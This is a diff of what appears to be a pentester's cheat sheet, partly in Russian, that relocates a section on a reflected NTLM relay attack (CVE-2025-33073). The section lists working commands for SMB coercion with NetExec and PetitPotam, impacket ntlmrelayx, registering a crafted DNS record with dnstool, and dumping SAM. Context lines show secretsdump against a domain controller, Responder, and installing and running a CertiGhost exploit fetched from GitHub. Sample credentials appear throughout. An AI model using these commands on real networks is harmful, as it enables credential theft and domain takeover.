@@ -1096,28 +1096,7 @@
 		secretsdump.py -k -no-pass -dc-ip '10.129.205.35' @'dc01.inlanefreight.local'
     		
 # NTLMRELAY ATTACK
-	
-# (CVE-2025-33073) reflected-ntlm-relay
-	nxc smb 192.168.0.100 -u 'max' -p 'P@ssword123' -M ntlm_reflection
-	1. Проверьте статус подписи SMB и уязвимости, связанные с принуждением: подпись smb должна быть отключена
-	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus
-	2. Запустите SMB Relay Listener
-	impacket-ntlmrelayx -t <target-ip> -smb2support
-	3. Зарегистрируйте DNS-запись
-	Мы создаем специальную DNS-запись, чтобы обмануть Windows и заставить ее думать, что она взаимодействует сама с собой:
-	python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -a add -d <my-ip> <dc-ip> (-dns-ip <dc-ip>)
-	4. Принудительное выполнение команд на рабочей станции с помощью NetExec или PetitPotam
-	Теперь мы используем NetExec or PetitPotam для принудительного выполнения на хосте-жертве исходящей аутентификации NTLM с использованием нашего поддельного DNS-имени:
-	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
-	proxychains nxc smb DC01 -u svc_sql -p 'jkhnrjk123!' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ALWAYS=TRUE
-	
-	5. Сброс SAM после аутентификации SYSTEM
-	После успешного принудительного применения (аутентификации) мы извлекаем токен SYSTEM и сбрасываем SAM
-	в окне
-	impacket-ntlmrelayx -t <target-ip> -smb2support
 
-	
-	
 	Запускаем респондер и убираем в нем smb = off and http = off
 	
  	python3 Responder.py -I ens192
@@ -1916,6 +1895,26 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		https://github.com/marcgoam/CVE-2026-54121-CertiGhost
 		sudo pip install --break-system-packages git+https://github.com/fortra/impacket.git cryptography pyasn1 asn1crypto pycryptodome dnspython
 		sudo python3 certighost.py -d lab.local -u max -p 'P@ssword123!' --dc-ip 192.168.0.200
+
+# (CVE-2025-33073) reflected-ntlm-relay
+	nxc smb 192.168.0.100 -u 'max' -p 'P@ssword123' -M ntlm_reflection
+	1. Проверьте статус подписи SMB и уязвимости, связанные с принуждением: подпись smb должна быть отключена
+	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus
+	2. Запустите SMB Relay Listener
+	impacket-ntlmrelayx -t <target-ip> -smb2support
+	3. Зарегистрируйте DNS-запись
+	Мы создаем специальную DNS-запись, чтобы обмануть Windows и заставить ее думать, что она взаимодействует сама с собой:
+	python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -a add -d <my-ip> <dc-ip> (-dns-ip <dc-ip>)
+	4. Принудительное выполнение команд на рабочей станции с помощью NetExec или PetitPotam
+	Теперь мы используем NetExec or PetitPotam для принудительного выполнения на хосте-жертве исходящей аутентификации NTLM с использованием нашего поддельного DNS-имени:
+	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+	proxychains nxc smb DC01 -u svc_sql -p 'jkhnrjk123!' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ALWAYS=TRUE
+	
+	5. Сброс SAM после аутентификации SYSTEM
+	После успешного принудительного применения (аутентификации) мы извлекаем токен SYSTEM и сбрасываем SAM
+	в окне
+	impacket-ntlmrelayx -t <target-ip> -smb2support
+
 
 # Kerberos Reflection (CVE-2026-26128) — LPE → SYSTEM напрямую
 	если DC и CA на одном хосте
